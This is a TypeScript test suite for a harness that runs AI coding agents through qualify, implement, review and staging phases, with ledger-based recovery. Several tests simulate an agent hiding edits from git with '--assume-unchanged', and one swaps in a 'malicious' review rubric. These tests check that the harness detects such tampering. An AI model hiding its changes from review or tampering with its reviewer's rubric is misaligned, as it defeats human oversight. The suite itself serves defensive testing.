    ledger.invocations.find((invocation) => invocation.id === 'runtime:stage')!.inputSha256 = 'expired';
    saveLedger(first.host.dataDir, first.host.runId, ledger);
    const restaged = f.make(); expect(await runHarnessDriver(restaged.host, input, restaged.deps)).toBeNull();
    expect(restaged.ops.filter((op) => op.id === 'stage')).toHaveLength(1);
    const indexPath = join(f.git('rev-parse', '--absolute-git-dir').trim(), 'index'); const index = readFileSync(indexPath);
    const resumed = f.make(); expect(await runHarnessDriver(resumed.host, input, resumed.deps)).toBeNull();
    expect(resumed.ops.filter((op) => op.id === 'stage')).toHaveLength(0);
    expect(readFileSync(indexPath)).toEqual(index);
    const recovery = loadLedger(resumed.host.dataDir, resumed.host.runId)!;
    recovery.phases.find((phase) => phase.id === 'stage')!.status = 'running';
    recovery.stage = { status: 'pending' }; saveLedger(resumed.host.dataDir, resumed.host.runId, recovery);
    const restarted = f.make(); expect(await runHarnessDriver(restarted.host, input, restarted.deps)).toBeNull();
    expect(restarted.ops.filter((op) => op.id === 'stage')).toHaveLength(1);
    expect(loadLedger(restarted.host.dataDir, restarted.host.runId)?.stage.stagedPaths).toEqual(paths);
    expect(f.git('rev-parse', 'HEAD')).toBe(head); expect(f.git('reflog', 'show', 'HEAD')).toBe(reflog);
  });

  it.each(['initial', 'F4', 'restart'] as const)('[r9-lock] blocks %s staging with actionable stale-lock recovery', async (entry) => {
    const f = round7StageHarness();
    const lock = join(f.git('rev-parse', '--absolute-git-dir').trim(), 'index.lock');
    if (entry !== 'initial') {
      const first = f.make();
      expect(await runHarnessDriver(first.host, input, first.deps)).toBeNull();
      const ledger = loadLedger(first.host.dataDir, first.host.runId)!;
      if (entry === 'restart') ledger.phases.find((phase) => phase.id === 'stage')!.status = 'running';
      else ledger.invocations.find((invocation) => invocation.id === 'runtime:stage')!.inputSha256 = 'expired';
      saveLedger(first.host.dataDir, first.host.runId, ledger);
    }
    const next = f.make();
    const original = next.agentBehavior.get('implement')!;
    next.agentBehavior.set('implement', async (req) => {
      await original(req);
      f.git('update-index', '--assume-unchanged', 'src/x');
      writeFileSync(join(f.cwd, 'src/x'), 'hidden edit\n');
      writeFileSync(lock, 'held');
      return null;
    });
    if (entry !== 'initial') {
      f.git('update-index', '--assume-unchanged', 'src/x');
      writeFileSync(join(f.cwd, 'src/x'), 'hidden edit\n');
      writeFileSync(lock, 'held');
    }
    const create = next.deps.createRuntime!;
    next.deps.createRuntime = (opts) => {
      const runtime = create(opts);
      return { ...runtime, run: async (op, args, options) => {
        if (op === 'stage') rmSync(lock, { force: true });
        return runtime.run(op, args, options);
      } };
    };
    try {
      const result = await runHarnessDriver(next.host, input, next.deps);
      expect(loadLedger(next.host.dataDir, next.host.runId)?.outcome.status).toBe('blocked');
      expect(result).toMatch(/another git process holds the index lock.*Continue to retry/);
      expect(result).toContain(`if no git process is running, delete ${lock}, then Continue`);
      expect(readFileSync(lock, 'utf8')).toBe('held');
      expect(next.ops.filter((op) => op.id === 'stage')).toHaveLength(0);
    } finally { rmSync(lock, { force: true }); }
  });

  it('guard: [r8-reset-error] blocks on a non-lock reset failure without retrying', async () => {
    const f = round7StageHarness(); const next = f.make(); const realExec = childProcess.execFileSync; let resets = 0;
    vi.spyOn(childProcess, 'execFileSync').mockImplementation(((file, args, options) => {
      const opts = options as { env?: Record<string, string> };
      if (file === 'git' && Array.isArray(args) && args.includes('read-tree') && !opts?.env?.GIT_INDEX_FILE) {
        resets += 1; throw new Error('index is corrupt');
      }
      return realExec(file, args, options);
    }) as typeof childProcess.execFileSync); syncBuiltinESMExports();
    try {
      const result = await runHarnessDriver(next.host, input, next.deps);
      expect(loadLedger(next.host.dataDir, next.host.runId)?.outcome.status).toBe('blocked');
      expect(result).toBe('could not reset the harness index — Continue to retry: index is corrupt');
      expect(resets).toBe(2); // The existing non-sparse read-tree fallback is retained.
      expect(next.ops.filter((op) => op.id === 'stage')).toHaveLength(0);
      expect(loadLedger(next.host.dataDir, next.host.runId)?.outcome.status).toBe('blocked');
    } finally { vi.restoreAllMocks(); syncBuiltinESMExports(); }
  });

  it('guard: [r8-backoff] stages hidden edits when the lock is released within backoff', async () => {
    const f = round7StageHarness(); const next = f.make();
    const lock = join(f.git('rev-parse', '--absolute-git-dir').trim(), 'index.lock');
    const original = next.agentBehavior.get('implement')!;
    next.agentBehavior.set('implement', async (req) => {
      await original(req); f.git('update-index', '--assume-unchanged', 'src/x');
      writeFileSync(join(f.cwd, 'src/x'), 'hidden edit\n'); writeFileSync(lock, 'held'); return null;
    });
    const realExec = childProcess.execFileSync;
    let resets = 0;
    let release: ReturnType<typeof setTimeout> | undefined;
    vi.spyOn(childProcess, 'execFileSync').mockImplementation(((file, args, options) => {
      const opts = options as { env?: Record<string, string> };
      if (file === 'git' && Array.isArray(args) && args.includes('read-tree') && !opts?.env?.GIT_INDEX_FILE && existsSync(lock)) {
        if (++resets === 1) release = setTimeout(() => rmSync(lock, { force: true }), 1);
      }
      return realExec(file, args, options);
    }) as typeof childProcess.execFileSync);
    syncBuiltinESMExports();
    try {
      expect(await runHarnessDriver(next.host, input, next.deps)).toBeNull();
      expect(resets).toBeGreaterThanOrEqual(2);
      expect(f.git('diff', '--cached', '--name-only')).toBe('src/a.txt\nsrc/new\nsrc/x\n');
      expect(loadLedger(next.host.dataDir, next.host.runId)?.outcome.status).toBe('ready');
    } finally {
      if (release) clearTimeout(release);
      rmSync(lock, { force: true }); vi.restoreAllMocks(); syncBuiltinESMExports();
    }
  });

  it.each([['[r8-nested] untracked nested repository stages its gitlink', 'nested repository'], ['guard: [r8-nested] an untracked plain directory lists files', 'plain directory']] as const)('%s', async (_name, kind) => {
    const f = round7StageHarness(); const next = f.make();
    next.agentBehavior.set('implement', (req) => {
      const nested = join(f.cwd, 'nested'); mkdirSync(nested);
      writeFileSync(join(nested, 'file'), 'content\n');
      if (kind === 'nested repository') {
        const git = (...args: string[]) => execFileSync('git', args, { cwd: nested, stdio: ['pipe', 'pipe', 'pipe'] });
        git('init', '-q'); git('add', '.'); git('-c', 'user.email=test@local', '-c', 'user.name=test', 'commit', '-qm', 'nested');
      }
      writeFileSync(req.resultPath, JSON.stringify({ changedPaths: ['nested/'] })); return null;
    });
    expect(await runHarnessDriver(next.host, input, next.deps)).toBeNull();
    const paths = kind === 'nested repository' ? ['nested'] : ['nested/file'];
    expect(loadLedger(next.host.dataDir, next.host.runId)?.stage.stagedPaths).toEqual(paths);
    expect(f.git('diff', '--cached', '--raw')).toContain(kind === 'nested repository' ? '160000' : '100644');
    const again = f.make(); expect(await runHarnessDriver(again.host, input, again.deps)).toBeNull();
    expect(again.ops.filter((op) => op.id === 'stage')).toHaveLength(0);
  });

  it('[r8-sparse-delete-driver] an out-of-cone git rm reaches ready and reuses its reviewed deletion', async () => {
    const f = round7StageHarness(); mkdirSync(join(f.cwd, 'outside'));
    writeFileSync(join(f.cwd, 'outside/file'), 'base\n'); f.git('add', 'outside'); f.git('commit', '-qm', 'outside base');
    f.git('sparse-checkout', 'set', '--cone', 'src'); const next = f.make();
    next.agentBehavior.set('implement', (req) => {
      f.git('rm', '--sparse', 'outside/file');
      writeFileSync(req.resultPath, JSON.stringify({ changedPaths: ['outside/file'] })); return null;
    });
    expect(await runHarnessDriver(next.host, input, next.deps)).toBeNull();
    expect(loadLedger(next.host.dataDir, next.host.runId)?.outcome.status).toBe('ready');
    expect(f.git('diff', '--cached', '--name-status')).toBe('D\toutside/file\n');
    const again = f.make(); expect(await runHarnessDriver(again.host, input, again.deps)).toBeNull();
    expect(again.ops.filter((op) => op.id === 'stage')).toHaveLength(0);
  });

  it('[r8-events] F4 rediscovery block emits pending phase and stage updates', async () => {
    const f = round7StageHarness(); const first = f.make();
    expect(await runHarnessDriver(first.host, input, first.deps)).toBeNull();
    const ledger = loadLedger(first.host.dataDir, first.host.runId)!;
    ledger.invocations.find((entry) => entry.id === 'runtime:stage')!.inputSha256 = 'expired';
    saveLedger(first.host.dataDir, first.host.runId, ledger);
    const next = f.make(); let calls = 0;
    next.deps.discoverChangedPaths = () => ++calls === 1 ? ['src/a.txt', 'src/new'] : null;
    expect(await runHarnessDriver(next.host, input, next.deps)).toMatch(/could not derive/);
    expect(next.events).toContainEqual(expect.objectContaining({ type: 'harness.phase.updated', stepId: 'stage', phase: expect.objectContaining({ status: 'pending' }) }));
    expect(next.events).toContainEqual(expect.objectContaining({ type: 'harness.stage.updated', stage: { status: 'pending' }, actionRevision: expect.any(String) }));
  });

  it('guard: [r8-events] reused stage emits no invalidation update', async () => {
    const f = round7StageHarness(); const first = f.make();
    expect(await runHarnessDriver(first.host, input, first.deps)).toBeNull();
    const next = f.make(); expect(await runHarnessDriver(next.host, input, next.deps)).toBeNull();
    expect(next.events.filter((event) => event.type === 'harness.stage.updated')).toEqual([]);
  });

  it('[r7-reuse] re-stages identical bytes after a review input expires', async () => {
    const f = round7StageHarness();
    const first = f.make();
    expect(await runHarnessDriver(first.host, input, first.deps)).toBeNull();
    const before = loadLedger(first.host.dataDir, first.host.runId)!;
    before.invocations.find((entry) => entry.phaseId === 'review')!.inputSha256 = 'updated-rubric';
    saveLedger(first.host.dataDir, first.host.runId, before);
    const next = f.make();
    expect(await runHarnessDriver(next.host, input, next.deps)).toBeNull();
    const after = loadLedger(next.host.dataDir, next.host.runId)!;
    const cached = f.git('diff', '--cached', '--name-only').trim().split('\n');
    expect(cached, 'index must match the staged ledger').toEqual(['src/a.txt', 'src/new']);
    expect(cached).toEqual(after.stage.stagedPaths);
    expect(next.ops.filter((op) => op.id === 'stage')).toHaveLength(1);
    expect(after.invocations.find((entry) => entry.id === 'runtime:stage')).toMatchObject({ status: 'completed', attempt: 2 });
  });

  it('guard: [r7-reuse] unchanged staged handoff promotes a pending outcome without resetting', async () => {
    const f = round7StageHarness();
    const first = f.make();
    expect(await runHarnessDriver(first.host, input, first.deps)).toBeNull();
    const ledger = loadLedger(first.host.dataDir, first.host.runId)!;
    ledger.outcome = { status: 'pending', blockingReasons: [] };
    saveLedger(first.host.dataDir, first.host.runId, ledger);
    const indexPath = join(f.git('rev-parse', '--absolute-git-dir').trim(), 'index');
    const index = readFileSync(indexPath);
    const next = f.make();
    expect(await runHarnessDriver(next.host, input, next.deps)).toBeNull();
    expect(next.ops.filter((op) => op.id === 'stage')).toHaveLength(0);
    expect(readFileSync(indexPath)).toEqual(index);
    expect(loadLedger(next.host.dataDir, next.host.runId)?.outcome.status).toBe('ready');
  });

  it.each(['pending', 'running', 'done'] as const)('[r7-restart] completed runtime with %s stage phase re-stages safely', async (status) => {
    const f = round7StageHarness();
    const first = f.make();
    expect(await runHarnessDriver(first.host, input, first.deps)).toBeNull();
    const ledger = loadLedger(first.host.dataDir, first.host.runId)!;
    ledger.phases.find((entry) => entry.id === 'stage')!.status = status;
    ledger.stage = { status: 'pending' };
    ledger.outcome = { status: 'pending', blockingReasons: [] };
    saveLedger(first.host.dataDir, first.host.runId, ledger);
    const next = f.make();
    expect(await runHarnessDriver(next.host, input, next.deps)).toBeNull();
    expect(f.git('diff', '--cached', '--name-only')).toBe('src/a.txt\nsrc/new\n');
    expect(next.ops.filter((op) => op.id === 'stage')).toHaveLength(1);
    expect(loadLedger(next.host.dataDir, next.host.runId)?.stage.status).toBe('staged');
  });

  it('[r7-discovery] invalidates the stage before F4 reset even when rediscovery fails', async () => {
    const f = round7StageHarness();
    const first = f.make();
    expect(await runHarnessDriver(first.host, input, first.deps)).toBeNull();
    const ledger = loadLedger(first.host.dataDir, first.host.runId)!;
    const stageInvocation = ledger.invocations.find((entry) => entry.id === 'runtime:stage')!;
    const originalInputSha256 = stageInvocation.inputSha256;
    stageInvocation.inputSha256 = 'expired';
    saveLedger(first.host.dataDir, first.host.runId, ledger);
    const next = f.make();
    let calls = 0;
    next.deps.discoverChangedPaths = () => ++calls === 1 ? ['src/a.txt', 'src/new'] : null;
    expect(await runHarnessDriver(next.host, input, next.deps)).toMatch(/could not derive/);
    const after = loadLedger(next.host.dataDir, next.host.runId)!;
    expect(f.git('diff', '--cached')).toBe('');
    expect(after.stage.status, 'reset index cannot be reported staged').toBe('pending');
    const phase = after.phases.find((entry) => entry.id === 'stage')!;
    expect(phase.status).toBe('pending');
    for (const field of ['startedAt', 'endedAt', 'error'] as const) expect(phase[field]).toBeUndefined();
    expect(after.claim?.held).toBe(false);
    after.invocations.find((entry) => entry.id === 'runtime:stage')!.inputSha256 = originalInputSha256;
    saveLedger(next.host.dataDir, next.host.runId, after);
    const retry = f.make();
    expect(await runHarnessDriver(retry.host, input, retry.deps)).toBeNull();
    expect(f.git('diff', '--cached', '--name-only')).toBe('src/a.txt\nsrc/new\n');
    expect(retry.ops.filter((op) => op.id === 'stage')).toHaveLength(1);
  });

  it.each(['discovery', 'subject'] as const)('[r7-early] reset stage stays pending on initial %s failure', async (failure) => {
    const f = round7StageHarness();
    const first = f.make();
    expect(await runHarnessDriver(first.host, input, first.deps)).toBeNull();
    const ledger = loadLedger(first.host.dataDir, first.host.runId)!;
    ledger.phases.find((entry) => entry.id === 'stage')!.status = 'pending';
    saveLedger(first.host.dataDir, first.host.runId, ledger);
    const next = f.make();
    if (failure === 'discovery') next.deps.discoverChangedPaths = () => null;
    else next.deps.snapshotStageSubject = async () => { throw new Error('subject unavailable'); };
    expect(await runHarnessDriver(next.host, input, next.deps)).toMatch(/could not/);
    expect(f.git('diff', '--cached')).toBe('');
    const after = loadLedger(next.host.dataDir, next.host.runId)!;
    expect(after.stage.status).toBe('pending');
    expect(after.claim?.held).toBe(false);
  });

  it.each([false, true])('[r7-outcome] F4 preserves validation and contested outcome (accepted=%s)', async (accepted) => {
    const f = round7StageHarness();
    const first = f.make();
    expect(await runHarnessDriver(first.host, input, first.deps)).toBeNull();
    const ledger = loadLedger(first.host.dataDir, first.host.runId)!;
    ledger.outcome = { status: 'contested', blockingReasons: ['review risk'], ...(accepted ? { acceptedAt: '2026-10-27T10:00:00.000Z', acceptedBy: 'user', acceptanceReason: 'reviewed risk' } : {}) };
    ledger.invocations.find((entry) => entry.id === 'runtime:stage')!.inputSha256 = 'expired';
    saveLedger(first.host.dataDir, first.host.runId, ledger);
    const next = f.make();
    expect(await runHarnessDriver(next.host, input, next.deps)).toBeNull();
    const after = loadLedger(next.host.dataDir, next.host.runId)!;
    expect(after.outcome).toEqual(ledger.outcome);
    expect(after.validation).toEqual(ledger.validation);
    expect(after.stage.prBody).toContain('`echo ok` → passed');
    expect(after.stage.prBody).toContain('review risk');
    expect(next.ops.filter((op) => op.id === 'stage')).toHaveLength(1);
  });

  it('guard: [r7-outcome] a failed F4 re-stage blocks a contested run', async () => {
    const f = round7StageHarness();
    const first = f.make();
    expect(await runHarnessDriver(first.host, input, first.deps)).toBeNull();
    const ledger = loadLedger(first.host.dataDir, first.host.runId)!;
    ledger.outcome = { status: 'contested', blockingReasons: ['review risk'] };
    ledger.invocations.find((entry) => entry.id === 'runtime:stage')!.inputSha256 = 'expired';
    saveLedger(first.host.dataDir, first.host.runId, ledger);
    const next = f.make();
    const create = next.deps.createRuntime!;
    next.deps.createRuntime = (opts) => {
      const runtime = create(opts);
      return { ...runtime, run: async (op, args, options) => {
        if (op === 'stage') writeFileSync(join(f.git('rev-parse', '--absolute-git-dir').trim(), 'index.lock'), 'held');
        return runtime.run(op, args, options);
      } };
    };
    expect(await runHarnessDriver(next.host, input, next.deps)).toMatch(/stage refused/);
    const after = loadLedger(next.host.dataDir, next.host.runId)!;
    expect(after.stage.status).toBe('failed');
    expect(after.outcome.status).toBe('blocked');
  });

  it.each(['untracked', 'tracked'] as const)('[r7-discovery-buffer] stages a %s path list larger than one MiB', async (state) => {
    const f = round7StageHarness();
    const paths = Array.from({ length: 12_000 }, (_, i) => `src/${String(i).padStart(5, '0')}-${'x'.repeat(100)}.txt`);
    if (state === 'tracked') {
      for (const path of paths) writeFileSync(join(f.cwd, path), 'base\n');
      f.git('add', 'src');
      f.git('commit', '-qm', 'large tracked fixture');
    }
    const h = f.make();
    h.agentBehavior.set('implement', (req) => {
      for (const path of paths) writeFileSync(join(f.cwd, path), 'handoff\n');
      writeFileSync(req.resultPath, JSON.stringify({ changedPaths: paths }));
      return null;
    });
    expect(await runHarnessDriver(h.host, input, h.deps)).toBeNull();
    const ledger = loadLedger(h.host.dataDir, h.host.runId)!;
    expect(ledger.stage.stagedPaths).toEqual(paths);
    expect(f.git('diff', '--cached', '--name-only', '-z').split('\0').filter(Boolean)).toEqual(paths);
  }, 60_000);

  it('guard: [r7-hooks] discovery keeps undeclared real worktree changes in the handoff', async () => {
    const f = round7StageHarness();
    const h = f.make();
    h.agentBehavior.set('implement', (req) => {
      for (const path of ['src/a.txt', 'src/new']) writeFileSync(join(f.cwd, path), 'handoff\n');
      writeFileSync(req.resultPath, JSON.stringify({ changedPaths: ['src/a.txt'] }));
      return null;
    });
    expect(await runHarnessDriver(h.host, input, h.deps)).toBeNull();
    expect(loadLedger(h.host.dataDir, h.host.runId)?.stage.stagedPaths).toEqual(['src/a.txt', 'src/new']);
  });

  it('[r7-hooks] changed-path discovery disables hooks on both git calls', async () => {
    const f = round7StageHarness();
    const h = f.make();
    const spy = vi.spyOn(childProcess, 'execFileSync');
    syncBuiltinESMExports();
    try {
      expect(await runHarnessDriver(h.host, input, h.deps)).toBeNull();
      const discovery = spy.mock.calls.filter(([cmd, args]) => cmd === 'git' && Array.isArray(args) && (
        args.includes('--exclude-standard') || (args.includes('--name-only') && args.includes('HEAD'))
      ));
      expect(discovery).toHaveLength(2);
      for (const [, args] of discovery) expect(args).toEqual(expect.arrayContaining(['-c', 'core.hooksPath=/dev/null']));
    } finally {
      spy.mockRestore();
      syncBuiltinESMExports();
    }
  });

  it('reruns stage when the complete post-review code subject changes', async () => {
    const first = makeHarness(dir);
    expect(await runHarnessDriver(first.host, input, first.deps)).toBeNull();

    const resumed = makeHarness(dir);
    resumed.deps.snapshotStageSubject = async () => 'changed-stage-subject';
    expect(await runHarnessDriver(resumed.host, input, resumed.deps)).toBeNull();

    expect(resumed.ops.map((operation) => operation.id)).toContain('stage');
    expect(
      loadLedger(resumed.host.dataDir, resumed.host.runId)?.invocations.find(
        (invocation) => invocation.id === 'runtime:stage',
      ),
    ).toMatchObject({ status: 'completed', attempt: 1 });
  });

  it('guard: clears prior risk acceptance when the reviewed subject is invalidated', async () => {
    const first = makeHarness(dir);
    expect(await runHarnessDriver(first.host, input, first.deps)).toBeNull();
    const accepted = loadLedger(first.host.dataDir, first.host.runId)!;
    accepted.outcome = {
      status: 'contested',
      blockingReasons: ['previously reviewed risk'],
      acceptedAt: '2026-10-22T10:00:00.000Z',
      acceptedBy: 'user',
      acceptanceReason: 'accepted for the previous diff',
    };
    saveLedger(first.host.dataDir, first.host.runId, accepted);

    const unchanged = makeHarness(dir);
    expect(await runHarnessDriver(unchanged.host, input, unchanged.deps)).toBeNull();
    expect(loadLedger(first.host.dataDir, first.host.runId)?.outcome.acceptedAt).toBe(
      accepted.outcome.acceptedAt,
    );

    const changed = makeHarness(dir);
    changed.deps.snapshotStageSubject = async () => 'changed-stage-subject';
    changed.deps.snapshotReviewSubject = async () => 'changed-review-subject';
    expect(await runHarnessDriver(changed.host, input, changed.deps)).toBeNull();
    const outcome = loadLedger(first.host.dataDir, first.host.runId)?.outcome;
    expect(outcome?.acceptedAt).toBeUndefined();
    expect(outcome?.acceptedBy).toBeUndefined();
    expect(outcome?.acceptanceReason).toBeUndefined();
  });

  it('retries a changed completed artifact and invalidates every downstream gate', async () => {
    const first = makeHarness(dir);
    expect(await runHarnessDriver(first.host, input, first.deps)).toBeNull();

    const qualifyPath = join(
      harnessAgentOutputDir(first.host.dataDir, first.host.runId),
      'phase-qualify',
      'result.json',
    );
    writeFileSync(
      qualifyPath,
      JSON.stringify({ outcome: 'work_needed', evidence: 'tampered after completion' }),
      'utf8',
    );

    const resumed = makeHarness(dir);
    expect(await runHarnessDriver(resumed.host, input, resumed.deps)).toBeNull();

    expect(resumed.calls.map((call) => call.id)).toContain('qualify');
    expect(resumed.calls.map((call) => call.id)).toContain('stage');
    const ledger = loadLedger(resumed.host.dataDir, resumed.host.runId);
    expect(
      ledger?.invocations.find((invocation) => invocation.id === 'agent:qualify:claude'),
    ).toMatchObject({ status: 'completed', attempt: 2 });
    expect(ledger?.stage.status).toBe('staged');
    expect(ledger?.outcome.status).toBe('ready');
  });

  it('reruns review when regenerated passing validation has different evidence', async () => {
    const first = makeHarness(dir);
    expect(await runHarnessDriver(first.host, input, first.deps)).toBeNull();
    const validationPath = join(
      harnessArtifactDir(first.host.dataDir, first.host.runId),
      'validation-validate.json',
    );
    writeFileSync(validationPath, '{"tampered":true}', 'utf8');

    const resumed = makeHarness(dir);
    resumed.deps.validate = async (commands) =>
      commands.map((command) => ({
        command,
        status: 'passed' as const,
        exitCode: 0,
        evidence: 'new passing evidence after recovery',
      }));
    expect(await runHarnessDriver(resumed.host, input, resumed.deps)).toBeNull();

    expect(resumed.calls.map((call) => call.id)).toContain('review');
    expect(
      loadLedger(resumed.host.dataDir, resumed.host.runId)?.invocations.find(
        (invocation) => invocation.phaseId === 'review',
      ),
    ).toMatchObject({ attempt: 1, status: 'completed' });
  });

  it('reuses the preflight-pinned review rubric when the worktree copy is tampered with', async () => {
    const bundledRoot = join(dir, 'pinned-bundled');
    writeTestSkill(bundledRoot, 'cez-harness', '# cez-harness pinned v1\n');
    const first = makeHarness(dir);
    first.deps.bundledSkillsRoot = bundledRoot;
    first.host.ensureSkill = async (name) => {
      materializeTestSkill(dir, name, `# ${name} pinned v1\n`);
      return true;
    };
    let reviewAttempts = 0;
    first.agentBehavior.set('review', (req) => {
      reviewAttempts += 1;
      writeFileSync(
        req.resultPath,
        reviewAttempts === 1
          ? '{"invalid":"review"}'
          : JSON.stringify({ verdict: 'approve', findings: [] }),
        'utf8',
      );
      return null;
    });
    expect(await runHarnessDriver(first.host, input, first.deps)).toBeNull();
    expect(
      loadLedger(first.host.dataDir, first.host.runId)?.invocations.find(
        (invocation) => invocation.phaseId === 'review',
      ),
    ).toMatchObject({ attempt: 2, status: 'completed' });

    const rubricPath = join(dir, '.claude', 'skills', 'om-code-review', 'SKILL.md');
    writeFileSync(rubricPath, '# malicious worktree rubric\n', 'utf8');
    const resumed = makeHarness(dir);
    resumed.deps.bundledSkillsRoot = bundledRoot;
    expect(await runHarnessDriver(resumed.host, input, resumed.deps)).toBeNull();

    expect(resumed.calls.map((call) => call.id)).not.toContain('review');
    expect(readFileSync(rubricPath, 'utf8')).toContain('malicious worktree rubric');
    expect(
      loadLedger(resumed.host.dataDir, resumed.host.runId)?.invocations.find(
        (invocation) => invocation.phaseId === 'review',
      ),
    ).toMatchObject({ attempt: 2, status: 'completed' });

    const pinnedRubric = join(
      harnessArtifactDir(first.host.dataDir, first.host.runId),
      'trusted-skills',
      'om-code-review',
      'SKILL.md',
    );
    writeFileSync(pinnedRubric, '# tampered pinned rubric\n', 'utf8');
    const compromised = makeHarness(dir);
    compromised.deps.bundledSkillsRoot = bundledRoot;
    expect(await runHarnessDriver(compromised.host, input, compromised.deps)).toMatch(
      /pinned skill "om-code-review" is missing or changed/,
    );
    expect(compromised.calls.filter((call) => call.kind === 'agent')).toHaveLength(0);
  });

  it('terminates a token-matched orphaned paid invocation before recovery reruns it', async () => {
    const h = makeHarness(dir);
    const ledger = createLedger({
      workflow: HARNESS_FIX_ISSUE,
      requestedProfile: 'standard',
      subject: { kind: 'issue', id: '642', text: input.task },
    });
    ledger.invocations.push({
      id: 'agent:qualify:claude',
      phaseId: 'qualify',
      role: 'host',
      binding: { runner: 'claude' },
      status: 'running',
      attempt: 1,
      inputSha256: 'prior-input',
      startedAt: new Date(Date.now() - 1_000).toISOString(),
      process: { pid: 4242, token: 'run-token', startedAt: new Date().toISOString() },
    });
    saveLedger(h.host.dataDir, h.host.runId, ledger);
    const reconciled: number[] = [];
    h.deps.reconcileProcess = async (identity) => {
      reconciled.push(identity.pid);
      return { status: 'terminated' };
    };

    expect(await runHarnessDriver(h.host, input, h.deps)).toBeNull();

    expect(reconciled).toEqual([4242]);
    const recovered = loadLedger(h.host.dataDir, h.host.runId)?.invocations.find(
      (invocation) => invocation.id === 'agent:qualify:claude',
    );
    expect(recovered).toMatchObject({ status: 'completed', attempt: 1 });
    expect(recovered?.process).toBeUndefined();
    expect(loadLedger(h.host.dataDir, h.host.runId)?.skillProfile).toBe('open-mercato');
  });

  it('persists a runner PID and ownership token before awaiting paid agent work', async () => {
    const h = makeHarness(dir);
    let observedProcess: unknown;
    h.agentBehavior.set('qualify', (req) => {
      expect(req.env.CEZ_PROCESS_TOKEN).toMatch(/^[0-9a-f-]{36}$/);
      req.onSpawn?.(4242);
      observedProcess = loadLedger(h.host.dataDir, h.host.runId)?.invocations.find(
        (invocation) => invocation.id === 'agent:qualify:claude',
      )?.process;
      writeFileSync(
        req.resultPath,
        JSON.stringify({ outcome: 'work_needed', evidence: 'bug reproduced on main' }),
        'utf8',
      );
      return null;
    });

    expect(await runHarnessDriver(h.host, input, h.deps)).toBeNull();

    expect(observedProcess).toMatchObject({
      pid: 4242,
      token: expect.any(String),
      group: false,
    });
    expect(
      loadLedger(h.host.dataDir, h.host.runId)?.invocations.find(
        (invocation) => invocation.id === 'agent:qualify:claude',
      )?.process,
    ).toBeUndefined();
  });

  const strandedInvocation = () => {
    const ledger = createLedger({
      workflow: HARNESS_FIX_ISSUE,
      requestedProfile: 'standard',
      skillProfile: 'open-mercato',
      subject: { kind: 'issue', id: '642', text: input.task },
    });
    ledger.invocations.push({
      id: 'advisor:impl:1:kimi',
      phaseId: 'review',
      role: 'reviewer',
      binding: { runner: 'harness', model: 'kimi' },
      status: 'running',
      attempt: 1,
      inputSha256: 'prior-input',
      process: { pid: 4242, token: 'old-token', startedAt: new Date().toISOString() },
    });
    return ledger;
  };

  // `mismatch` proves the pid now runs another process, so the invocation's own
  // process is gone. Blocking on it re-blocked every Continue, with no route to clear it.
  it('recovers past a recorded PID that now belongs to another process', async () => {
    const h = makeHarness(dir);
    saveLedger(h.host.dataDir, h.host.runId, strandedInvocation());
    h.deps.reconcileProcess = async () => ({
      status: 'mismatch',
      error: 'pid 4242 no longer belongs to this harness invocation',
    });

    expect(await runHarnessDriver(h.host, input, h.deps)).toBeNull();

    const recovered = loadLedger(h.host.dataDir, h.host.runId)?.invocations.find(
      (invocation) => invocation.id === 'advisor:impl:1:kimi',
    );
    expect(recovered).toMatchObject({ status: 'interrupted' });
    expect(recovered?.process).toBeUndefined();
  });

  it('still fails closed when a recorded PID cannot be verified at all', async () => {
    const h = makeHarness(dir);
    saveLedger(h.host.dataDir, h.host.runId, strandedInvocation());
    h.deps.reconcileProcess = async () => ({
      status: 'unverified',
      error: 'cannot verify process identity for pid 4242 on win32',
    });

    const error = await runHarnessDriver(h.host, input, h.deps);

    expect(error).toMatch(/recovery blocked.*pid 4242/i);
    expect(h.calls).toHaveLength(0);
    expect(loadLedger(h.host.dataDir, h.host.runId)?.outcome).toMatchObject({ status: 'blocked' });
  });

  it('delivers a durable boundary message to the next agent phase and records consumption', async () => {
    const h = makeHarness(dir);
    const ledger = createLedger({
      workflow: HARNESS_FIX_ISSUE,
      requestedProfile: 'standard',
      skillProfile: 'open-mercato',
      subject: { kind: 'issue', id: '642', text: input.task },
    });
    ledger.pendingMessages.push({
      id: 'message-1',
      text: 'Preserve the compatibility alias.',
      createdAt: '2026-07-26T10:00:00.000Z',
    });
    saveLedger(h.host.dataDir, h.host.runId, ledger);
    h.agentBehavior.set('qualify', (req) => {
      expect(req.prompt).toContain('[message-1] Preserve the compatibility alias.');
      writeFileSync(
        req.resultPath,
        JSON.stringify({ outcome: 'work_needed', evidence: 'bug reproduced on main' }),
        'utf8',
      );
      return null;
    });

    expect(await runHarnessDriver(h.host, input, h.deps)).toBeNull();

    const resumed = loadLedger(h.host.dataDir, h.host.runId);
    expect(resumed?.pendingMessages[0]?.consumedAt).toBeTruthy();
    expect(
      h.events.some(
        (event) =>
          event.type === 'harness.message.consumed' &&
          (event.messageIds as string[]).includes('message-1'),
      ),
    ).toBe(true);
  });

  it('applies review-gate feedback through implementation and fresh gates on every continuation', async () => {
    const first = makeHarness(dir);
    expect(await runHarnessDriver(first.host, input, first.deps)).toBeNull();

    for (let round = 1; round <= 3; round += 1) {
      const ledger = loadLedger(first.host.dataDir, first.host.runId)!;
      ledger.reviewAction = { id: '44444444-4444-4444-8444-444444444444', action: 'verify', status: 'running', round: 2, findingIds: [], requestedAt: new Date().toISOString(), subjectSha256: 'superseded', onePass: true };
      ledger.pendingMessages.push({
        id: `feedback-${round}`,
        text: `Preserve correction ${round}.`,
        createdAt: new Date().toISOString(),
      });
      saveLedger(first.host.dataDir, first.host.runId, ledger);
      const resumed = makeHarness(dir);
      let implementPrompt = '';
      resumed.agentBehavior.set('implement', (req) => {
        implementPrompt = req.prompt;
        writeFileSync(req.resultPath, JSON.stringify({ changedPaths: ['src/fix.ts'] }));
        return null;
      });

      expect(await runHarnessDriver(resumed.host, input, resumed.deps)).toBeNull();

      expect(resumed.calls.filter((call) => call.kind === 'agent').map((call) => call.id))
        .toEqual(['implement', 'review']);
      expect(resumed.ops.map((call) => call.id)).toContain('stage');
      for (let correction = 1; correction <= round; correction += 1) {
        expect(implementPrompt).toContain(`Preserve correction ${correction}.`);
      }
      expect(loadLedger(first.host.dataDir, first.host.runId)?.pendingMessages.at(-1))
        .toMatchObject({ consumedByPhaseId: 'implement', consumedAt: expect.any(String) });
      expect(loadLedger(first.host.dataDir, first.host.runId)?.reviewAction).toBeUndefined();
    }
  });

  it('reconsiders a no-action result when the operator supplies new evidence', async () => {
    const first = makeHarness(dir);
    first.agentBehavior.set('qualify', (req) => {
